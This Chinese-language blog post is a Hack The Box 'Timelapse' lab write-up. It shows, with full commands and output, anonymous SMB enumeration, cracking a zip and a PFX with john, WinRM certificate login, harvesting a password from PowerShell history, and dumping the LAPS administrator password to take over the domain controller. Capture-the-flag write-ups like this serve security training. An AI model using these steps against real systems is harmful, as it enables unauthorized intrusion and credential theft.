---
title: HTB timlapse writeup
date: 2022-04-20 09:50:29
tags:
- linux
categories:
- 渗透
- HTB
---

|      IP      |   ROLE   |   OS    |
| :----------: | :------: | :-----: |
| 10.10.11.152 |  Victim  | Windows |
|  10.10.14.7  | Attacker |  Kali   |



> 如果你是在找writeup而看的这篇文章，那么请再坚持一下。这里给一点提示:
> 1. 需要用到暴力破解，但很简单
> 2. 了解laps的密码获取方法

命令参考了[cmder](https://github.com/Elinpf/cmder)工具中的命令。

## 获取普通权限

首先进行端口扫描

使用`cmder -p db/pentesting/1_enumeration/0_Nmap.xd`查看常用nmap命令，选择开局命令`cmder use 1 -do namp_start`

得到有效信息开放端口如下：

![](1.png)


我们知道，域控服务器需要常开的端口有：
kerberos : 88/TCP 88/UDP
LDAP : 389/TCPAK 636/TCP(如果使用 SSL)
LDAP ping : 389/UDP
DNS : 53/TCP 53/UDP
SMB over IP : 445/TCP 445/UDP
所以可以判断出这台主机为域控服务器。

那么接下来可以围绕如何获取域控管理员最高权限进行，因为有SMB，所以首先枚举SMB相关信息。

- [](!smb-渗透清单)

`cmder -p db/pentesting/1_enumeration/137_138_139_SMB.xd`

```bash
root@145a5d706052 /t/b/workspace# cmder use -r 3
[✓] Executing: smbmap -H 10.10.11.152
[+] IP: 10.10.11.152:445        Name: timelapse.htb
```

得到域名`timelapse.htb`, 将其添加到本地DNS解析中: `echo '10.10.11.152 timelapse.htb' >> /etc/hosts`

```bash
root@145a5d706052 /t/b/workspace# cmder use -r 5
[✓] Executing: smbclient -N -L //10.10.11.152

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        Shares          Disk
        SYSVOL          Disk      Logon server share
SMB1 disabled -- no workgroup available
```

可以看到能够使用匿名登录，逐个检查共享文件夹后，发现`Shares`文件可以访问。

```bash
root@145a5d706052 /t/b/workspace# cmder use -r 31
🦴 (custom) PWD [Password]:
[✓] Executing: smbmap -R ADMIN$ -H 10.10.11.152 -u guest
[+] IP: 10.10.11.152:445        Name: timelapse.htb
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS
root@145a5d706052 /t/b/workspace# cmder use -r 31
🦴 (custom) PWD [Password]:
[✓] Executing: smbmap -R Shares -H 10.10.11.152 -u guest
[+] IP: 10.10.11.152:445        Name: timelapse.htb
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        Shares                                                  READ ONLY
        .\Shares\*
        dr--r--r--                0 Mon Oct 25 15:55:14 2021    .
        dr--r--r--                0 Mon Oct 25 15:55:14 2021    ..
        dr--r--r--                0 Mon Oct 25 19:40:06 2021    Dev
        dr--r--r--                0 Mon Oct 25 15:55:14 2021    HelpDesk
        .\Shares\Dev\*
        dr--r--r--                0 Mon Oct 25 19:40:06 2021    .
        dr--r--r--                0 Mon Oct 25 19:40:06 2021    ..
        fr--r--r--             2611 Mon Oct 25 21:05:30 2021    winrm_backup.zip
        .\Shares\HelpDesk\*
        dr--r--r--                0 Mon Oct 25 15:55:14 2021    .
        dr--r--r--                0 Mon Oct 25 15:55:14 2021    ..
        fr--r--r--          1118208 Mon Oct 25 15:55:14 2021    LAPS.x64.msi
        fr--r--r--           104422 Mon Oct 25 15:55:14 2021    LAPS_Datasheet.docx
        fr--r--r--           641378 Mon Oct 25 15:55:14 2021    LAPS_OperationsGuide.docx
        fr--r--r--            72683 Mon Oct 25 15:55:14 2021    LAPS_TechnicalSpecification.docx
```

注意到`winrm_backup.zip`，将其下载下来。

```bash
root@145a5d706052 /t/b/workspace# cmder use -r 32
🦴 (custom) PWD [Password]:
[✓] Executing: smbmap -H 10.10.11.152 -u guest  --download 'Shares\Dev\winrm_backup.zip'
[+] Starting download: Shares\Dev\winrm_backup.zip (2611 bytes)
[+] File output to: /tmp/box_152/workspace/10.10.11.152-Shares_Dev_winrm_backup.zip
```

当解压的时候，提示需要密码：
```bash
root@145a5d706052 /t/b/workspace# unzip 10.10.11.152-Shares_Dev_winrm_backup.zip
Archive:  10.10.11.152-Shares_Dev_winrm_backup.zip
[10.10.11.152-Shares_Dev_winrm_backup.zip] legacyy_dev_auth.pfx password:
   skipping: legacyy_dev_auth.pfx    incorrect password
```

里面包含了`legacyy_dev_auth.pfx`敏感文件，是我们需要攻破的目标。

在查看了其他文件没有包含隐藏密码后，将思路转向密码破解。 这里用到了`cmder -p  db/pentesting/2_password_crack/offline_brute_force.xd`

利用`john`工具进行破解，首先需要将带破解文件转成hash值。

```bash
root@145a5d706052 /t/b/workspace# cmder use -r 2
🦴 (custom) file : 10.10.11.152-Shares_Dev_winrm_backup.zip
[✓] Executing: zip2john 10.10.11.152-Shares_Dev_winrm_backup.zip > 10.10.11.152-Shares_Dev_winrm_backup.zip.hash
ver 2.0 efh 5455 efh 7875 10.10.11.152-Shares_Dev_winrm_backup.zip/legacyy_dev_auth.pfx PKZIP Encr: TS_chk, cmplen=2405, decmplen=2555, crc=12EC5683 ts=72AA cs=72aa type=8
```

然后暴力破解

```bash
root@145a5d706052 /t/b/workspace# cmder use -r 5
[✓] Executing: john --wordlist=/usr/share/wordlists/rockyou.txt 10.10.11.152-Shares_Dev_winrm_backup.zip.hash
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Press Ctrl-C to abort, or send SIGUSR1 to john process for status
supremelegacy    (10.10.11.152-Shares_Dev_winrm_backup.zip/legacyy_dev_auth.pfx)
1g 0:00:00:00 DONE (2022-04-20 02:40) 1.449g/s 5027Kp/s 5027Kc/s 5027KC/s suprgirl..supreme99
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

得到密码`supremelegacy`后进行解压，得到`legacyy_dev_auth.pfx`文件

```bash
root@145a5d706052 /t/b/workspace [80]# unzip 10.10.11.152-Shares_Dev_winrm_backup.zip
Archive:  10.10.11.152-Shares_Dev_winrm_backup.zip
[10.10.11.152-Shares_Dev_winrm_backup.zip] legacyy_dev_auth.pfx password:
  inflating: legacyy_dev_auth.pfx
```

pfx是微软支持的私钥格式，包含了公钥和私钥的二进制格式的证书形式。所以可以通过pfx生成私钥和公钥。但是在此之前需要破解证书的加密密码。

```bash
root@145a5d706052 /t/b/workspace# cmder use -r 3
🦴 (custom) file : legacyy_dev_auth.pfx
[✓] Executing: pfx2john.py legacyy_dev_auth.pfx > legacyy_dev_auth.pfx.hash
root@145a5d706052 /t/b/workspace# vim legacyy_dev_auth.pfx.hash
root@145a5d706052 /t/b/workspace# cmder use -r 5
🦴 (custom) hash_file: legacyy_dev_auth.pfx.hash
[✓] Executing: john --wordlist=/usr/share/wordlists/rockyou.txt legacyy_dev_auth.pfx.hash
Using default input encoding: UTF-8
Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 512/512 AVX512BW 16x])
Cost 1 (iteration count) is 2000 for all loaded hashes
Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
Press Ctrl-C to abort, or send SIGUSR1 to john process for status
thuglegacy       (legacyy_dev_auth.pfx)
1g 0:00:01:21 DONE (2022-04-20 03:16) 0.01228g/s 39699p/s 39699c/s 39699C/s thuglife06..thugishxochitl@yahoo.com
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

注意在得到`legacyy_dev_auth.pfx.hash`文件后，需要对文件进行修改，因为将`b$`这样的修改为`$`，原因是在输出的时候还是使用的btye格式。

最后`john`破解的密码为`thuglegacy`。

有了pfx文件的密码，就可以得到私钥和公钥了。 `cmder -p db/pentesting/3_cryptography/1_certificates.xd`

```bash
root@145a5d706052 /t/b/workspace# cmder use -r 2
[✓] Executing: openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -nodes -out prv.key
Enter Import Password:
root@145a5d706052 /t/b/workspace# cmder use -r 3
[✓] Executing: openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out cert.crt
Enter Import Password:
root@145a5d706052 /t/b/workspace# ll
total 36K
-rw-r--r-- 1 root root 2.6K Apr 20 02:31 10.10.11.152-Shares_Dev_winrm_backup.zip
-rw-r--r-- 1 root root 5.0K Apr 20 02:37 10.10.11.152-Shares_Dev_winrm_backup.zip.hash
-rw------- 1 root root 1.3K Apr 20 03:21 cert.crt
-rwxr-xr-x 1 root root 2.5K Oct 25 14:21 legacyy_dev_auth.pfx
-rw-r--r-- 1 root root 5.0K Apr 20 03:14 legacyy_dev_auth.pfx.hash
-rw-r--r-- 1 root root 3.7K Apr 20 02:15 nmap_start
-rw------- 1 root root 2.0K Apr 20 03:21 prv.key
```

有了公钥和私钥，就可以想办法进行登录了。注意到开启了端口`5986 WinRM`服务，可以PowerShell登录。

`cmder -p db/pentesting/1_enumeration/5985_5986_WinRM.xd`

填写公钥和私钥后，成功登录

![](2.png)


## 获取管理员权限

- [](!域渗透清单)

这里我首次检查history就发现的问题

```bash
[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\legacyy\Desktop> type C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit
```

可以看到`svc_deploy`用户的密码为`E3R$Q62^12p7PLlC%KWaxuaV`

使用`evil-winrm`进行密码登录`evil-winrm -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV'  -i 10.10.11.152 -S`.

检查域相关内容。`cmder -p  db/windows/CMD_usefull_commands/2_domain.xd`

查看所有域账号

```bash
[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\svc_deploy\Documents> net user /domain

User accounts for \\

-------------------------------------------------------------------------------
Administrator            babywyrm                 Guest
krbtgt                   legacyy                  payl0ad
sinfulz                  svc_deploy               thecybergeek
TRX
The command completed with one or more errors.
```

查看管理员账号

```bash
[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\svc_deploy\Documents> net group "Domain Admins" /domain
Group name     Domain Admins
Comment        Designated administrators of the domain

Members

-------------------------------------------------------------------------------
Administrator            payl0ad                  thecybergeek
TRX
The command completed successfully.
```

判断是否有应用了LAPS(Local Administrator Password Solution)

```bash
[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\svc_deploy\Documents> reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft Services\AdmPwd
    AdmPwdEnabled    REG_DWORD    0x1
```


`cmder -p db/windows/0_privilege_escalation/2_logging_enumeration.xd`

```bash
root@145a5d706052 /t/b/workspace# cmder use -r 4
[✓] Executing: laps.py -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -d timelapse.htb
DC01$:LK/yg#uFR)x)Q3z!a[.080Tb
```

获得了DC01域控的管理员密码: `LK/yg#uFR)x)Q3z!a[.080Tb`
DC01的管理员就是`Administrator`，所以我们可以通过这个密码进行登录了

`cmder -p db/pentesting/1_enumeration/5985_5986_WinRM.xd`

```bash
root@145a5d706052 /t/b/workspace# cmder use -r 4
[✓] Executing: evil-winrm -u Administrator -p 'LK/yg#uFR)x)Q3z!a[.080Tb' -i 10.10.11.152 -S

Evil-WinRM shell v2.3

Warning: SSL enabled

Info: Establishing connection to remote endpoint

[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\Administrator\Documents>
```

## 总结

这题考察了如何zip和pfx文件的破解，pfx证书的公钥私钥的转化。
提权部分考察了laps的密码dump方式。


